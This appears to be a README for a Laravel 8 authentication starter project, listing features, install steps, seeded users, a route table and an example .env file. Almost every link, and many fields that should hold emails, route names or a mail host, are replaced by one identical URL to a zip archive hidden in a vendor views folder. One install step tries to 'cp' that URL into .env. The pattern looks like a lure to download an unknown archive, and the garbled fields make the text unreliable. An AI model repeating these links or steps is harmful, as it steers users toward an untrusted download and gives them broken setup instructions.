## Laravel Auth

#### Laravel Auth is a Complete Build of Laravel 8 with Email Registration Verification, User Roles and Permissions, User Profiles, and Admin restricted user management system. Built on Bootstrap 4.

#### Table of contents
- [About](#about)
- [Features](#features)
- [Installation Instructions](#installation-instructions)
    - [Build the Front End Assets with Mix](#build-the-front-end-assets-with-mix)
    - [Optionally Build Cache](#optionally-build-cache)
- [Seeds](#seeds)
    - [Seeded Roles](#seeded-roles)
    - [Seeded Permissions](#seeded-permissions)
    - [Seeded Users](#seeded-users)
- [Routes](#routes)
- [Environment File](#environment-file)
- [Screenshots](#screenshots)
- [File Tree](#file-tree)

### About
Laravel 8 with user authentication, registration with email confirmation and password recovery. Uses official [Bootstrap 4](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip). This also makes full use of Controllers for the routes, templates for the views, and makes use of middleware for routing. Project can be stood up in minutes.

### Features
#### A [Laravel](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) 8.x with [Bootstrap](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) 4.x project.

| Laravel Auth Features  |
| :------------ |
|Built on [Laravel](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) 8|
|Built on [Bootstrap](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) 4|
|Uses [MySQL](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) Database (can be changed)|
|Uses [Artisan](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) to manage database migration, schema creations, and create/publish page controller templates|
|Dependencies are managed with [COMPOSER](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|Laravel Scaffolding **User** and **Administrator Authentication**.|
|CRUD (Create, Read, Update, Delete) User Management|
|Robust [Laravel Logging](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) with admin UI using MonoLog|
|User Registration with email verification (Can be activated or deactivated from .env file) |
|Makes use of Laravel [Mix](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) to compile assets|
|Makes use of [Language Localization Files](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|Active Nav states using [Laravel Requests](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|Restrict User Email Activation Attempts|
|Capture IP to users table upon signup|
|Uses [Laravel Debugger](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip) for development|
|Makes use of [Password Strength Meter](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|Makes use of [hideShowPassword](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|User Avatar Image AJAX Upload with [https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|User Gravatar using [Gravatar API](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|User Password Reset via Email Token|
|User Login with remember password|
|User [Roles/ACL Implementation]|
|Roles and Permissions GUI|
|Makes use of [Laravel's Soft Delete Structure](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)|
|Soft Deleted Users Management System|
|Permanently Delete Soft Deleted Users|
|User Delete Account with Goodbye email|
|User Restore Deleted Account Token|
|Restore Soft Deleted Users|
|View Soft Deleted Users|
|Captures Soft Delete Date|
|Captures Soft Delete IP|
|Admin Routing Details UI|
|Admin PHP Information UI|
|Eloquent user profiles|
|404 Page|
|403 Page|
|Configurable Email Notification via [Laravel-Exception-Notifier]|
|Optional 2-step account login verfication with [Laravel 2-Step Verification]|

### Installation Instructions
1. Clone the repo
2. Create a MySQL database for the project
    * ```mysql -u root -p```, if using Vagrant: ```mysql -u homestead -psecret```
    * ```create database laravelAuth;```
    * ```\q```
3. From the projects root run `cp https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip .env`
4. Configure your `.env` file
5. Run `composer update` from the projects root folder
6. From the projects root folder run:
```
php artisan vendor:publish --tag=laravelroles &&
php artisan vendor:publish --tag=laravel2step
```
7. From the projects root folder run `sudo chmod -R 755 ../laravel-auth`
8. From the projects root folder run `php artisan key:generate`
9. From the projects root folder run `php artisan migrate`
10. From the projects root folder run `composer dump-autoload`
11. From the projects root folder run `php artisan db:seed`

#### Optionally Build Cache
1. From the projects root folder run `php artisan config:cache`

###### And thats it with the caveat of setting up and configuring your development environment. I recommend [Laravel Homestead](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)

### Seeds
##### Seeded Roles
  * Unverified - Level 0
  * User  - Level 1
  * Administrator - Level 5

##### Seeded Permissions
  * https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
  * https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
  * https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
  * https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip

##### Seeded Users

|Email|Password|Access|
|:------------|:------------|:------------|
|https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip|password|User Access|
|https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip|password|Admin Access|

### Routes

```bash
+--------+----------------------------------------+---------------------------------------+-----------------------------------------------+-----------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+
| Domain | Method                                 | URI                                   | Name                                          | Action                                                                                                          | Middleware                                                   |
+--------+----------------------------------------+---------------------------------------+-----------------------------------------------+-----------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+
|        | GET|HEAD                               | /                                     | welcome                                       | App\Http\Controllers\WelcomeController@welcome                                                                  | web                                             |
|        | GET|HEAD                               | _debugbar/assets/javascript           | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                            | Barryvdh\Debugbar\Controllers\AssetController@js                                                                | Barryvdh\Debugbar\Middleware\DebugbarEnabled,Closure         |
|        | GET|HEAD                               | _debugbar/assets/stylesheets          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                           | Barryvdh\Debugbar\Controllers\AssetController@css                                                               | Barryvdh\Debugbar\Middleware\DebugbarEnabled,Closure         |
|        | DELETE                                 | _debugbar/cache/{key}/{tags?}         | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                         | Barryvdh\Debugbar\Controllers\CacheController@delete                                                            | Barryvdh\Debugbar\Middleware\DebugbarEnabled,Closure         |
|        | GET|HEAD                               | _debugbar/clockwork/{id}              | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                            | Barryvdh\Debugbar\Controllers\OpenHandlerController@clockwork                                                   | Barryvdh\Debugbar\Middleware\DebugbarEnabled,Closure         |
|        | GET|HEAD                               | _debugbar/open                        | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                          | Barryvdh\Debugbar\Controllers\OpenHandlerController@handle                                                      | Barryvdh\Debugbar\Middleware\DebugbarEnabled,Closure         |
|        | GET|HEAD                               | _debugbar/telescope/{id}              | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                            | Barryvdh\Debugbar\Controllers\TelescopeController@show                                                          | Barryvdh\Debugbar\Middleware\DebugbarEnabled,Closure         |
|        | GET|HEAD                               | activate                              | activate                                      | App\Http\Controllers\Auth\ActivateController@initial                                                            | web,activity,auth                               |
|        | GET|HEAD                               | activate/{token}                      | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                        | App\Http\Controllers\Auth\ActivateController@activate                                                           | web,activity,auth                               |
|        | GET|HEAD                               | activation                            | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip               | App\Http\Controllers\Auth\ActivateController@resend                                                             | web,activity,auth                               |
|        | GET|HEAD                               | activation-required                   | activation-required                           | App\Http\Controllers\Auth\ActivateController@activationRequired                                                 | web,auth,activated,activity                     |
|        | GET|HEAD                               | active-users                          |                                               | App\Http\Controllers\AdminDetailsController@activeUsers                                                         | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | activity                              | activity                                      | LaravelLogger\App\Http\Controllers\LaravelLoggerController@showAccessLog                           | web,auth,activity,role:admin                                 |
|        | DELETE                                 | activity/clear-activity               | clear-activity                                | LaravelLogger\App\Http\Controllers\LaravelLoggerController@clearActivityLog                        | web,auth,activity,role:admin                                 |
|        | GET|HEAD                               | activity/cleared                      | cleared                                       | LaravelLogger\App\Http\Controllers\LaravelLoggerController@showClearedActivityLog                  | web,auth,activity,role:admin                                 |
|        | GET|HEAD                               | activity/cleared/log/{id}             |                                               | LaravelLogger\App\Http\Controllers\LaravelLoggerController@showClearedAccessLogEntry               | web,auth,activity,role:admin                                 |
|        | DELETE                                 | activity/destroy-activity             | destroy-activity                              | LaravelLogger\App\Http\Controllers\LaravelLoggerController@destroyActivityLog                      | web,auth,activity,role:admin                                 |
|        | GET|HEAD                               | activity/log/{id}                     |                                               | LaravelLogger\App\Http\Controllers\LaravelLoggerController@showAccessLogEntry                      | web,auth,activity,role:admin                                 |
|        | POST                                   | activity/restore-log                  | restore-activity                              | LaravelLogger\App\Http\Controllers\LaravelLoggerController@restoreClearedActivityLog               | web,auth,activity,role:admin                                 |
|        | POST                                   | avatar/upload                         | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                 | App\Http\Controllers\ProfilesController@upload                                                                  | web,auth,activated,currentUser,activity,twostep |
|        | GET|HEAD                               | exceeded                              | exceeded                                      | App\Http\Controllers\Auth\ActivateController@exceeded                                                           | web,activity,auth                               |
|        | GET|HEAD                               | home                                  | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                   | App\Http\Controllers\UserController@index                                                                       | web,auth,activated,activity,twostep             |
|        | GET|HEAD                               | images/profile/{id}/avatar/{image}    |                                               | App\Http\Controllers\ProfilesController@userProfileAvatar                                                       | web,auth,activated,currentUser,activity,twostep |
|        | POST                                   | login                                 |                                               | App\Http\Controllers\Auth\LoginController@login                                                                 | web,guest                                                    |
|        | GET|HEAD                               | login                                 | login                                         | App\Http\Controllers\Auth\LoginController@showLoginForm                                                         | web,guest                                                    |
|        | POST                                   | logout                                | logout                                        | App\Http\Controllers\Auth\LoginController@logout                                                                | web                                                          |
|        | GET|HEAD                               | logout                                | logout                                        | App\Http\Controllers\Auth\LoginController@logout                                                                | web,auth,activated,activity                     |
|        | GET|HEAD                               | logs                                  |                                               | Rap2hpoutre\LaravelLogViewer\LogViewerController@index                                                          | web,auth,activated,role:admin,activity,twostep  |
|        | POST                                   | password/email                        | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                | App\Http\Controllers\Auth\ForgotPasswordController@sendResetLinkEmail                                           | web,guest                                                    |
|        | GET|HEAD                               | password/reset                        | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                              | App\Http\Controllers\Auth\ForgotPasswordController@showLinkRequestForm                                          | web,guest                                                    |
|        | POST                                   | password/reset                        | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                               | App\Http\Controllers\Auth\ResetPasswordController@reset                                                         | web,guest                                                    |
|        | GET|HEAD                               | password/reset/{token}                | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                | App\Http\Controllers\Auth\ResetPasswordController@showResetForm                                                 | web,guest                                                    |
|        | GET|HEAD                               | permission-deleted/{id}               | laravelroles::permission-show-deleted         | LaravelRoles\App\Http\Controllers\LaravelpermissionsDeletedController@show                         | web,auth,role:admin                                          |
|        | DELETE                                 | permission-destroy/{id}               | laravelroles::permission-item-destroy         | LaravelRoles\App\Http\Controllers\LaravelpermissionsDeletedController@destroy                      | web,auth,role:admin                                          |
|        | PUT                                    | permission-restore/{id}               | laravelroles::permission-restore              | LaravelRoles\App\Http\Controllers\LaravelpermissionsDeletedController@restorePermission            | web,auth,role:admin                                          |
|        | POST                                   | permissions                           | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip               | LaravelRoles\App\Http\Controllers\LaravelPermissionsController@store                               | web,auth,role:admin                                          |
|        | GET|HEAD                               | permissions                           | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip               | LaravelRoles\App\Http\Controllers\LaravelPermissionsController@index                               | web,auth,role:admin                                          |
|        | GET|HEAD                               | permissions-deleted                   | laravelroles::permissions-deleted             | LaravelRoles\App\Http\Controllers\LaravelpermissionsDeletedController@index                        | web,auth,role:admin                                          |
|        | DELETE                                 | permissions-deleted-destroy-all       | laravelroles::destroy-all-deleted-permissions | LaravelRoles\App\Http\Controllers\LaravelpermissionsDeletedController@destroyAllDeletedPermissions | web,auth,role:admin                                          |
|        | POST                                   | permissions-deleted-restore-all       | laravelroles::permissions-deleted-restore-all | LaravelRoles\App\Http\Controllers\LaravelpermissionsDeletedController@restoreAllDeletedPermissions | web,auth,role:admin                                          |
|        | GET|HEAD                               | permissions/create                    | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip              | LaravelRoles\App\Http\Controllers\LaravelPermissionsController@create                              | web,auth,role:admin                                          |
|        | GET|HEAD                               | permissions/{permission}              | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                | LaravelRoles\App\Http\Controllers\LaravelPermissionsController@show                                | web,auth,role:admin                                          |
|        | DELETE                                 | permissions/{permission}              | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip             | LaravelRoles\App\Http\Controllers\LaravelPermissionsController@destroy                             | web,auth,role:admin                                          |
|        | PUT|PATCH                              | permissions/{permission}              | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip              | LaravelRoles\App\Http\Controllers\LaravelPermissionsController@update                              | web,auth,role:admin                                          |
|        | GET|HEAD                               | permissions/{permission}/edit         | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                | LaravelRoles\App\Http\Controllers\LaravelPermissionsController@edit                                | web,auth,role:admin                                          |
|        | GET|HEAD|POST|PUT|PATCH|DELETE|OPTIONS | php                                   |                                               | Illuminate\Routing\RedirectController                                                                           | web                                                          |
|        | GET|HEAD                               | phpinfo                               | laravelPhpInfo::phpinfo                       | LaravelPhpInfo\App\Http\Controllers\LaravelPhpInfoController@phpinfo                               | web,auth,activated,role:admin,activity,twostep               |
|        | GET|HEAD                               | profile/create                        | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                | App\Http\Controllers\ProfilesController@create                                                                  | web,auth,activated,currentUser,activity,twostep |
|        | PUT|PATCH                              | profile/{profile}                     | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                | App\Http\Controllers\ProfilesController@update                                                                  | web,auth,activated,currentUser,activity,twostep |
|        | GET|HEAD                               | profile/{profile}                     | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                  | App\Http\Controllers\ProfilesController@show                                                                    | web,auth,activated,currentUser,activity,twostep |
|        | GET|HEAD                               | profile/{profile}/edit                | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                  | App\Http\Controllers\ProfilesController@edit                                                                    | web,auth,activated,currentUser,activity,twostep |
|        | GET|HEAD                               | profile/{username}                    | {username}                                    | App\Http\Controllers\ProfilesController@show                                                                    | web,auth,activated,activity,twostep             |
|        | DELETE                                 | profile/{username}/deleteUserAccount  | {username}                                    | App\Http\Controllers\ProfilesController@deleteUserAccount                                                       | web,auth,activated,currentUser,activity,twostep |
|        | PUT                                    | profile/{username}/updateUserAccount  | {username}                                    | App\Http\Controllers\ProfilesController@updateUserAccount                                                       | web,auth,activated,currentUser,activity,twostep |
|        | PUT                                    | profile/{username}/updateUserPassword | {username}                                    | App\Http\Controllers\ProfilesController@updateUserPassword                                                      | web,auth,activated,currentUser,activity,twostep |
|        | GET|HEAD                               | re-activate/{token}                   | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                               | App\Http\Controllers\RestoreUserController@userReActivate                                                       | web,activity                                    |
|        | POST                                   | register                              |                                               | App\Http\Controllers\Auth\RegisterController@register                                                           | web,guest                                                    |
|        | GET|HEAD                               | register                              | register                                      | App\Http\Controllers\Auth\RegisterController@showRegistrationForm                                               | web,guest                                                    |
|        | GET|HEAD                               | role-deleted/{id}                     | laravelroles::role-show-deleted               | LaravelRoles\App\Http\Controllers\LaravelRolesDeletedController@show                               | web,auth,role:admin                                          |
|        | DELETE                                 | role-destroy/{id}                     | laravelroles::role-item-destroy               | LaravelRoles\App\Http\Controllers\LaravelRolesDeletedController@destroy                            | web,auth,role:admin                                          |
|        | PUT                                    | role-restore/{id}                     | laravelroles::role-restore                    | LaravelRoles\App\Http\Controllers\LaravelRolesDeletedController@restoreRole                        | web,auth,role:admin                                          |
|        | POST                                   | roles                                 | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                     | LaravelRoles\App\Http\Controllers\LaravelRolesController@store                                     | web,auth,role:admin                                          |
|        | GET|HEAD                               | roles                                 | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                     | LaravelRoles\App\Http\Controllers\LaravelRolesController@index                                     | web,auth,role:admin                                          |
|        | GET|HEAD                               | roles-deleted                         | laravelroles::roles-deleted                   | LaravelRoles\App\Http\Controllers\LaravelRolesDeletedController@index                              | web,auth,role:admin                                          |
|        | DELETE                                 | roles-deleted-destroy-all             | laravelroles::destroy-all-deleted-roles       | LaravelRoles\App\Http\Controllers\LaravelRolesDeletedController@destroyAllDeletedRoles             | web,auth,role:admin                                          |
|        | POST                                   | roles-deleted-restore-all             | laravelroles::roles-deleted-restore-all       | LaravelRoles\App\Http\Controllers\LaravelRolesDeletedController@restoreAllDeletedRoles             | web,auth,role:admin                                          |
|        | GET|HEAD                               | roles/create                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                    | LaravelRoles\App\Http\Controllers\LaravelRolesController@create                                    | web,auth,role:admin                                          |
|        | GET|HEAD                               | roles/{role}                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                      | LaravelRoles\App\Http\Controllers\LaravelRolesController@show                                      | web,auth,role:admin                                          |
|        | PUT|PATCH                              | roles/{role}                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                    | LaravelRoles\App\Http\Controllers\LaravelRolesController@update                                    | web,auth,role:admin                                          |
|        | DELETE                                 | roles/{role}                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                   | LaravelRoles\App\Http\Controllers\LaravelRolesController@destroy                                   | web,auth,role:admin                                          |
|        | GET|HEAD                               | roles/{role}/edit                     | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                      | LaravelRoles\App\Http\Controllers\LaravelRolesController@edit                                      | web,auth,role:admin                                          |
|        | GET|HEAD                               | routes                                |                                               | App\Http\Controllers\AdminDetailsController@listRoutes                                                          | web,auth,activated,role:admin,activity,twostep  |
|        | POST                                   | search-users                          | search-users                                  | App\Http\Controllers\UsersManagementController@search                                                           | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | terms                                 | terms                                         | App\Http\Controllers\TermsController@terms                                                                      | web                                             |
|        | GET|HEAD                               | users                                 | users                                         | App\Http\Controllers\UsersManagementController@index                                                            | web,auth,activated,role:admin,activity,twostep  |
|        | POST                                   | users                                 | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                   | App\Http\Controllers\UsersManagementController@store                                                            | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | users/create                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                  | App\Http\Controllers\UsersManagementController@create                                                           | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | users/deleted                         | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                 | App\Http\Controllers\SoftDeletesController@index                                                                | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | users/deleted/{deleted}               | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                  | App\Http\Controllers\SoftDeletesController@show                                                                 | web,auth,activated,role:admin,activity,twostep  |
|        | DELETE                                 | users/deleted/{deleted}               | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                               | App\Http\Controllers\SoftDeletesController@destroy                                                              | web,auth,activated,role:admin,activity,twostep  |
|        | PUT|PATCH                              | users/deleted/{deleted}               | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                | App\Http\Controllers\SoftDeletesController@update                                                               | web,auth,activated,role:admin,activity,twostep  |
|        | DELETE                                 | users/{user}                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                  | App\Http\Controllers\UsersManagementController@destroy                                                          | web,auth,activated,role:admin,activity,twostep  |
|        | PUT|PATCH                              | users/{user}                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                  | App\Http\Controllers\UsersManagementController@update                                                           | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | users/{user}                          | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                    | App\Http\Controllers\UsersManagementController@show                                                             | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | users/{user}/edit                     | https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip                                    | App\Http\Controllers\UsersManagementController@edit                                                             | web,auth,activated,role:admin,activity,twostep  |
|        | GET|HEAD                               | verification/needed                   | laravel2step::verificationNeeded              | laravel2step\App\Http\Controllers\TwoStepController@showVerification                               | web,auth,Closure                                             |
|        | POST                                   | verification/resend                   | laravel2step::resend                          | laravel2step\App\Http\Controllers\TwoStepController@resend                                         | web,auth,Closure                                             |
|        | POST                                   | verification/verify                   | laravel2step::verify                          | laravel2step\App\Http\Controllers\TwoStepController@verify                                         | web,auth,Closure                                             |
+--------+----------------------------------------+---------------------------------------+-----------------------------------------------+-----------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+
```

### Environment File
Example `.env` file:

```bash

APP_NAME=Laravel
APP_ENV=local
APP_KEY=
APP_DEBUG=true
APP_URL=http://localhost
APP_PROJECT_VERSION=7

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=

BROADCAST_DRIVER=pusher
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=null
MAIL_FROM_NAME="${APP_NAME}"

EMAIL_EXCEPTION_ENABLED=false
EMAIL_EXCEPTION_FROM="${MAIL_FROM_ADDRESS}"
EMAIL_EXCEPTION_TO='https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip, https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip'
EMAIL_EXCEPTION_CC=''
EMAIL_EXCEPTION_BCC=''
EMAIL_EXCEPTION_SUBJECT=''

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

